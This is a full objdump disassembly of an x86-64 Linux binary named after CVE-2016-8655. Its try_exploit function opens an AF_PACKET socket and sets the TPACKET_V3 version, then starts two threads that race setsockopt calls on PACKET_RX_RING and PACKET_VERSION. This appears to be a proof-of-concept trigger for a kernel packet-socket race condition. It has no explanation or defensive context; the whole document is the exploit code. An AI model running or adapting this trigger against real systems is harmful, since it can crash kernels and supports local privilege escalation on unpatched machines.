
CVE-2016-8655:     file format elf64-x86-64


Disassembly of section .init:

0000000000400738 <_init>:
  400738:	48 83 ec 08          	sub    $0x8,%rsp
  40073c:	48 8b 05 b5 08 20 00 	mov    0x2008b5(%rip),%rax        # 600ff8 <__gmon_start__>
  400743:	48 85 c0             	test   %rax,%rax
  400746:	74 05                	je     40074d <_init+0x15>
  400748:	e8 83 00 00 00       	callq  4007d0 <__gmon_start__@plt>
  40074d:	48 83 c4 08          	add    $0x8,%rsp
  400751:	c3                   	retq   

Disassembly of section .plt:

0000000000400760 <.plt>:
  400760:	ff 35 a2 08 20 00    	pushq  0x2008a2(%rip)        # 601008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400766:	ff 25 a4 08 20 00    	jmpq   *0x2008a4(%rip)        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40076c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400770 <pthread_create@plt>:
  400770:	ff 25 a2 08 20 00    	jmpq   *0x2008a2(%rip)        # 601018 <pthread_create@GLIBC_2.2.5>
  400776:	68 00 00 00 00       	pushq  $0x0
  40077b:	e9 e0 ff ff ff       	jmpq   400760 <.plt>

0000000000400780 <puts@plt>:
  400780:	ff 25 9a 08 20 00    	jmpq   *0x20089a(%rip)        # 601020 <puts@GLIBC_2.2.5>
  400786:	68 01 00 00 00       	pushq  $0x1
  40078b:	e9 d0 ff ff ff       	jmpq   400760 <.plt>

0000000000400790 <setsockopt@plt>:
  400790:	ff 25 92 08 20 00    	jmpq   *0x200892(%rip)        # 601028 <setsockopt@GLIBC_2.2.5>
  400796:	68 02 00 00 00       	pushq  $0x2
  40079b:	e9 c0 ff ff ff       	jmpq   400760 <.plt>

00000000004007a0 <htons@plt>:
  4007a0:	ff 25 8a 08 20 00    	jmpq   *0x20088a(%rip)        # 601030 <htons@GLIBC_2.2.5>
  4007a6:	68 03 00 00 00       	pushq  $0x3
  4007ab:	e9 b0 ff ff ff       	jmpq   400760 <.plt>

00000000004007b0 <close@plt>:
  4007b0:	ff 25 82 08 20 00    	jmpq   *0x200882(%rip)        # 601038 <close@GLIBC_2.2.5>
  4007b6:	68 04 00 00 00       	pushq  $0x4
  4007bb:	e9 a0 ff ff ff       	jmpq   400760 <.plt>

00000000004007c0 <__libc_start_main@plt>:
  4007c0:	ff 25 7a 08 20 00    	jmpq   *0x20087a(%rip)        # 601040 <__libc_start_main@GLIBC_2.2.5>
  4007c6:	68 05 00 00 00       	pushq  $0x5
  4007cb:	e9 90 ff ff ff       	jmpq   400760 <.plt>

00000000004007d0 <__gmon_start__@plt>:
  4007d0:	ff 25 72 08 20 00    	jmpq   *0x200872(%rip)        # 601048 <__gmon_start__>
  4007d6:	68 06 00 00 00       	pushq  $0x6
  4007db:	e9 80 ff ff ff       	jmpq   400760 <.plt>

00000000004007e0 <pthread_join@plt>:
  4007e0:	ff 25 6a 08 20 00    	jmpq   *0x20086a(%rip)        # 601050 <pthread_join@GLIBC_2.2.5>
  4007e6:	68 07 00 00 00       	pushq  $0x7
  4007eb:	e9 70 ff ff ff       	jmpq   400760 <.plt>

00000000004007f0 <getpagesize@plt>:
  4007f0:	ff 25 62 08 20 00    	jmpq   *0x200862(%rip)        # 601058 <getpagesize@GLIBC_2.2.5>
  4007f6:	68 08 00 00 00       	pushq  $0x8
  4007fb:	e9 60 ff ff ff       	jmpq   400760 <.plt>

0000000000400800 <exit@plt>:
  400800:	ff 25 5a 08 20 00    	jmpq   *0x20085a(%rip)        # 601060 <exit@GLIBC_2.2.5>
  400806:	68 09 00 00 00       	pushq  $0x9
  40080b:	e9 50 ff ff ff       	jmpq   400760 <.plt>

0000000000400810 <fwrite@plt>:
  400810:	ff 25 52 08 20 00    	jmpq   *0x200852(%rip)        # 601068 <fwrite@GLIBC_2.2.5>
  400816:	68 0a 00 00 00       	pushq  $0xa
  40081b:	e9 40 ff ff ff       	jmpq   400760 <.plt>

0000000000400820 <sleep@plt>:
  400820:	ff 25 4a 08 20 00    	jmpq   *0x20084a(%rip)        # 601070 <sleep@GLIBC_2.2.5>
  400826:	68 0b 00 00 00       	pushq  $0xb
  40082b:	e9 30 ff ff ff       	jmpq   400760 <.plt>

0000000000400830 <socket@plt>:
  400830:	ff 25 42 08 20 00    	jmpq   *0x200842(%rip)        # 601078 <socket@GLIBC_2.2.5>
  400836:	68 0c 00 00 00       	pushq  $0xc
  40083b:	e9 20 ff ff ff       	jmpq   400760 <.plt>

Disassembly of section .text:

0000000000400840 <_start>:
  400840:	31 ed                	xor    %ebp,%ebp
  400842:	49 89 d1             	mov    %rdx,%r9
  400845:	5e                   	pop    %rsi
  400846:	48 89 e2             	mov    %rsp,%rdx
  400849:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  40084d:	50                   	push   %rax
  40084e:	54                   	push   %rsp
  40084f:	49 c7 c0 a0 0b 40 00 	mov    $0x400ba0,%r8
  400856:	48 c7 c1 30 0b 40 00 	mov    $0x400b30,%rcx
  40085d:	48 c7 c7 0b 0b 40 00 	mov    $0x400b0b,%rdi
  400864:	e8 57 ff ff ff       	callq  4007c0 <__libc_start_main@plt>
  400869:	f4                   	hlt    
  40086a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400870 <deregister_tm_clones>:
  400870:	b8 97 10 60 00       	mov    $0x601097,%eax
  400875:	55                   	push   %rbp
  400876:	48 2d 90 10 60 00    	sub    $0x601090,%rax
  40087c:	48 83 f8 0e          	cmp    $0xe,%rax
  400880:	48 89 e5             	mov    %rsp,%rbp
  400883:	77 02                	ja     400887 <deregister_tm_clones+0x17>
  400885:	5d                   	pop    %rbp
  400886:	c3                   	retq   
  400887:	b8 00 00 00 00       	mov    $0x0,%eax
  40088c:	48 85 c0             	test   %rax,%rax
  40088f:	74 f4                	je     400885 <deregister_tm_clones+0x15>
  400891:	5d                   	pop    %rbp
  400892:	bf 90 10 60 00       	mov    $0x601090,%edi
  400897:	ff e0                	jmpq   *%rax
  400899:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000004008a0 <register_tm_clones>:
  4008a0:	b8 90 10 60 00       	mov    $0x601090,%eax
  4008a5:	55                   	push   %rbp
  4008a6:	48 2d 90 10 60 00    	sub    $0x601090,%rax
  4008ac:	48 c1 f8 03          	sar    $0x3,%rax
  4008b0:	48 89 e5             	mov    %rsp,%rbp
  4008b3:	48 89 c2             	mov    %rax,%rdx
  4008b6:	48 c1 ea 3f          	shr    $0x3f,%rdx
  4008ba:	48 01 d0             	add    %rdx,%rax
  4008bd:	48 d1 f8             	sar    %rax
  4008c0:	75 02                	jne    4008c4 <register_tm_clones+0x24>
  4008c2:	5d                   	pop    %rbp
  4008c3:	c3                   	retq   
  4008c4:	ba 00 00 00 00       	mov    $0x0,%edx
  4008c9:	48 85 d2             	test   %rdx,%rdx
  4008cc:	74 f4                	je     4008c2 <register_tm_clones+0x22>
  4008ce:	5d                   	pop    %rbp
  4008cf:	48 89 c6             	mov    %rax,%rsi
  4008d2:	bf 90 10 60 00       	mov    $0x601090,%edi
  4008d7:	ff e2                	jmpq   *%rdx
  4008d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000004008e0 <__do_global_dtors_aux>:
  4008e0:	80 3d b1 07 20 00 00 	cmpb   $0x0,0x2007b1(%rip)        # 601098 <completed.6982>
  4008e7:	75 11                	jne    4008fa <__do_global_dtors_aux+0x1a>
  4008e9:	55                   	push   %rbp
  4008ea:	48 89 e5             	mov    %rsp,%rbp
  4008ed:	e8 7e ff ff ff       	callq  400870 <deregister_tm_clones>
  4008f2:	5d                   	pop    %rbp
  4008f3:	c6 05 9e 07 20 00 01 	movb   $0x1,0x20079e(%rip)        # 601098 <completed.6982>
  4008fa:	f3 c3                	repz retq 
  4008fc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400900 <frame_dummy>:
  400900:	48 83 3d 08 05 20 00 	cmpq   $0x0,0x200508(%rip)        # 600e10 <__JCR_END__>
  400907:	00 
  400908:	74 1e                	je     400928 <frame_dummy+0x28>
  40090a:	b8 00 00 00 00       	mov    $0x0,%eax
  40090f:	48 85 c0             	test   %rax,%rax
  400912:	74 14                	je     400928 <frame_dummy+0x28>
  400914:	55                   	push   %rbp
  400915:	bf 10 0e 60 00       	mov    $0x600e10,%edi
  40091a:	48 89 e5             	mov    %rsp,%rbp
  40091d:	ff d0                	callq  *%rax
  40091f:	5d                   	pop    %rbp
  400920:	e9 7b ff ff ff       	jmpq   4008a0 <register_tm_clones>
  400925:	0f 1f 00             	nopl   (%rax)
  400928:	e9 73 ff ff ff       	jmpq   4008a0 <register_tm_clones>

000000000040092d <setsockopt_thread>:
  40092d:	55                   	push   %rbp
  40092e:	48 89 e5             	mov    %rsp,%rbp
  400931:	48 83 ec 10          	sub    $0x10,%rsp
  400935:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
  400939:	8b 05 61 07 20 00    	mov    0x200761(%rip),%eax        # 6010a0 <sfd>
  40093f:	41 b8 1c 00 00 00    	mov    $0x1c,%r8d
  400945:	b9 b0 10 60 00       	mov    $0x6010b0,%ecx
  40094a:	ba 05 00 00 00       	mov    $0x5,%edx
  40094f:	be 07 01 00 00       	mov    $0x107,%esi
  400954:	89 c7                	mov    %eax,%edi
  400956:	e8 35 fe ff ff       	callq  400790 <setsockopt@plt>
  40095b:	b8 00 00 00 00       	mov    $0x0,%eax
  400960:	c9                   	leaveq 
  400961:	c3                   	retq   

0000000000400962 <vers_switcher>:
  400962:	55                   	push   %rbp
  400963:	48 89 e5             	mov    %rsp,%rbp
  400966:	48 83 ec 20          	sub    $0x20,%rsp
  40096a:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  40096e:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
  400975:	8b 05 25 07 20 00    	mov    0x200725(%rip),%eax        # 6010a0 <sfd>
  40097b:	48 8d 55 f8          	lea    -0x8(%rbp),%rdx
  40097f:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  400985:	48 89 d1             	mov    %rdx,%rcx
  400988:	ba 0a 00 00 00       	mov    $0xa,%edx
  40098d:	be 07 01 00 00       	mov    $0x107,%esi
  400992:	89 c7                	mov    %eax,%edi
  400994:	e8 f7 fd ff ff       	callq  400790 <setsockopt@plt>
  400999:	89 45 fc             	mov    %eax,-0x4(%rbp)
  40099c:	b8 00 00 00 00       	mov    $0x0,%eax
  4009a1:	c9                   	leaveq 
  4009a2:	c3                   	retq   

00000000004009a3 <try_exploit>:
  4009a3:	55                   	push   %rbp
  4009a4:	48 89 e5             	mov    %rsp,%rbp
  4009a7:	48 83 ec 20          	sub    $0x20,%rsp
  4009ab:	bf 06 08 00 00       	mov    $0x806,%edi
  4009b0:	e8 eb fd ff ff       	callq  4007a0 <htons@plt>
  4009b5:	0f b7 c0             	movzwl %ax,%eax
  4009b8:	89 c2                	mov    %eax,%edx
  4009ba:	be 02 00 00 00       	mov    $0x2,%esi
  4009bf:	bf 11 00 00 00       	mov    $0x11,%edi
  4009c4:	e8 67 fe ff ff       	callq  400830 <socket@plt>
  4009c9:	89 45 ec             	mov    %eax,-0x14(%rbp)
  4009cc:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%rbp)
  4009d0:	75 14                	jne    4009e6 <try_exploit+0x43>
  4009d2:	bf b4 0b 40 00       	mov    $0x400bb4,%edi
  4009d7:	e8 a4 fd ff ff       	callq  400780 <puts@plt>
  4009dc:	bf 01 00 00 00       	mov    $0x1,%edi
  4009e1:	e8 1a fe ff ff       	callq  400800 <exit@plt>
  4009e6:	c7 45 e8 02 00 00 00 	movl   $0x2,-0x18(%rbp)
  4009ed:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
  4009f1:	8b 45 ec             	mov    -0x14(%rbp),%eax
  4009f4:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  4009fa:	48 89 d1             	mov    %rdx,%rcx
  4009fd:	ba 0a 00 00 00       	mov    $0xa,%edx
  400a02:	be 07 01 00 00       	mov    $0x107,%esi
  400a07:	89 c7                	mov    %eax,%edi
  400a09:	e8 82 fd ff ff       	callq  400790 <setsockopt@plt>
  400a0e:	e8 dd fd ff ff       	callq  4007f0 <getpagesize@plt>
  400a13:	89 05 97 06 20 00    	mov    %eax,0x200697(%rip)        # 6010b0 <tp>
  400a19:	c7 05 91 06 20 00 01 	movl   $0x1,0x200691(%rip)        # 6010b4 <tp+0x4>
  400a20:	00 00 00 
  400a23:	e8 c8 fd ff ff       	callq  4007f0 <getpagesize@plt>
  400a28:	89 05 8a 06 20 00    	mov    %eax,0x20068a(%rip)        # 6010b8 <tp+0x8>
  400a2e:	c7 05 84 06 20 00 01 	movl   $0x1,0x200684(%rip)        # 6010bc <tp+0xc>
  400a35:	00 00 00 
  400a38:	c7 05 7e 06 20 00 10 	movl   $0x2710,0x20067e(%rip)        # 6010c0 <tp+0x10>
  400a3f:	27 00 00 
  400a42:	8b 45 ec             	mov    -0x14(%rbp),%eax
  400a45:	89 05 55 06 20 00    	mov    %eax,0x200655(%rip)        # 6010a0 <sfd>
  400a4b:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
  400a4f:	b9 00 00 00 00       	mov    $0x0,%ecx
  400a54:	ba 2d 09 40 00       	mov    $0x40092d,%edx
  400a59:	be 00 00 00 00       	mov    $0x0,%esi
  400a5e:	48 89 c7             	mov    %rax,%rdi
  400a61:	e8 0a fd ff ff       	callq  400770 <pthread_create@plt>
  400a66:	85 c0                	test   %eax,%eax
  400a68:	74 25                	je     400a8f <try_exploit+0xec>
  400a6a:	48 8b 05 1f 06 20 00 	mov    0x20061f(%rip),%rax        # 601090 <stderr@@GLIBC_2.2.5>
  400a71:	48 89 c1             	mov    %rax,%rcx
  400a74:	ba 16 00 00 00       	mov    $0x16,%edx
  400a79:	be 01 00 00 00       	mov    $0x1,%esi
  400a7e:	bf c8 0b 40 00       	mov    $0x400bc8,%edi
  400a83:	e8 88 fd ff ff       	callq  400810 <fwrite@plt>
  400a88:	b8 01 00 00 00       	mov    $0x1,%eax
  400a8d:	eb 7a                	jmp    400b09 <try_exploit+0x166>
  400a8f:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
  400a93:	b9 00 00 00 00       	mov    $0x0,%ecx
  400a98:	ba 62 09 40 00       	mov    $0x400962,%edx
  400a9d:	be 00 00 00 00       	mov    $0x0,%esi
  400aa2:	48 89 c7             	mov    %rax,%rdi
  400aa5:	e8 c6 fc ff ff       	callq  400770 <pthread_create@plt>
  400aaa:	85 c0                	test   %eax,%eax
  400aac:	74 25                	je     400ad3 <try_exploit+0x130>
  400aae:	48 8b 05 db 05 20 00 	mov    0x2005db(%rip),%rax        # 601090 <stderr@@GLIBC_2.2.5>
  400ab5:	48 89 c1             	mov    %rax,%rcx
  400ab8:	ba 16 00 00 00       	mov    $0x16,%edx
  400abd:	be 01 00 00 00       	mov    $0x1,%esi
  400ac2:	bf c8 0b 40 00       	mov    $0x400bc8,%edi
  400ac7:	e8 44 fd ff ff       	callq  400810 <fwrite@plt>
  400acc:	b8 01 00 00 00       	mov    $0x1,%eax
  400ad1:	eb 36                	jmp    400b09 <try_exploit+0x166>
  400ad3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  400ad7:	be 00 00 00 00       	mov    $0x0,%esi
  400adc:	48 89 c7             	mov    %rax,%rdi
  400adf:	e8 fc fc ff ff       	callq  4007e0 <pthread_join@plt>
  400ae4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400ae8:	be 00 00 00 00       	mov    $0x0,%esi
  400aed:	48 89 c7             	mov    %rax,%rdi
  400af0:	e8 eb fc ff ff       	callq  4007e0 <pthread_join@plt>
  400af5:	8b 45 ec             	mov    -0x14(%rbp),%eax
  400af8:	89 c7                	mov    %eax,%edi
  400afa:	e8 b1 fc ff ff       	callq  4007b0 <close@plt>
  400aff:	bf 69 7a 00 00       	mov    $0x7a69,%edi
  400b04:	e8 17 fd ff ff       	callq  400820 <sleep@plt>
  400b09:	c9                   	leaveq 
  400b0a:	c3                   	retq   

0000000000400b0b <main>:
  400b0b:	55                   	push   %rbp
  400b0c:	48 89 e5             	mov    %rsp,%rbp
  400b0f:	48 83 ec 10          	sub    $0x10,%rsp
  400b13:	89 7d fc             	mov    %edi,-0x4(%rbp)
  400b16:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
  400b1a:	b8 00 00 00 00       	mov    $0x0,%eax
  400b1f:	e8 7f fe ff ff       	callq  4009a3 <try_exploit>
  400b24:	b8 01 00 00 00       	mov    $0x1,%eax
  400b29:	c9                   	leaveq 
  400b2a:	c3                   	retq   
  400b2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000400b30 <__libc_csu_init>:
  400b30:	41 57                	push   %r15
  400b32:	41 89 ff             	mov    %edi,%r15d
  400b35:	41 56                	push   %r14
  400b37:	49 89 f6             	mov    %rsi,%r14
  400b3a:	41 55                	push   %r13
  400b3c:	49 89 d5             	mov    %rdx,%r13
  400b3f:	41 54                	push   %r12
  400b41:	4c 8d 25 b8 02 20 00 	lea    0x2002b8(%rip),%r12        # 600e00 <__frame_dummy_init_array_entry>
  400b48:	55                   	push   %rbp
  400b49:	48 8d 2d b8 02 20 00 	lea    0x2002b8(%rip),%rbp        # 600e08 <__init_array_end>
  400b50:	53                   	push   %rbx
  400b51:	4c 29 e5             	sub    %r12,%rbp
  400b54:	31 db                	xor    %ebx,%ebx
  400b56:	48 c1 fd 03          	sar    $0x3,%rbp
  400b5a:	48 83 ec 08          	sub    $0x8,%rsp
  400b5e:	e8 d5 fb ff ff       	callq  400738 <_init>
  400b63:	48 85 ed             	test   %rbp,%rbp
  400b66:	74 1e                	je     400b86 <__libc_csu_init+0x56>
  400b68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  400b6f:	00 
  400b70:	4c 89 ea             	mov    %r13,%rdx
  400b73:	4c 89 f6             	mov    %r14,%rsi
  400b76:	44 89 ff             	mov    %r15d,%edi
  400b79:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  400b7d:	48 83 c3 01          	add    $0x1,%rbx
  400b81:	48 39 eb             	cmp    %rbp,%rbx
  400b84:	75 ea                	jne    400b70 <__libc_csu_init+0x40>
  400b86:	48 83 c4 08          	add    $0x8,%rsp
  400b8a:	5b                   	pop    %rbx
  400b8b:	5d                   	pop    %rbp
  400b8c:	41 5c                	pop    %r12
  400b8e:	41 5d                	pop    %r13
  400b90:	41 5e                	pop    %r14
  400b92:	41 5f                	pop    %r15
  400b94:	c3                   	retq   
  400b95:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  400b9c:	00 00 00 00 

0000000000400ba0 <__libc_csu_fini>:
  400ba0:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000400ba4 <_fini>:
  400ba4:	48 83 ec 08          	sub    $0x8,%rsp
  400ba8:	48 83 c4 08          	add    $0x8,%rsp
  400bac:	c3                   	retq   
